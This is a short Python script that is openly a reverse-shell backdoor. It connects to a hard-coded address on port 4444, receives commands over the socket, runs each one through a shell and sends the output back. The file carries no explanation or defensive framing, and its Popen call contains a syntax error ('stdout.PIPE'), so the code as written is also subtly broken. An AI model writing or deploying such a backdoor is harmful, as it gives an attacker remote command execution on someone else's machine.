#!/usr/bin/python3

import socket 
import subprocess

server_ip = '192.168.29.5'
port = 4444
backdoor = socket.socket()
backdoor.connect((server_ip, port))



while True:
    command = backdoor.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    backdoor.send(output + output_error)
    
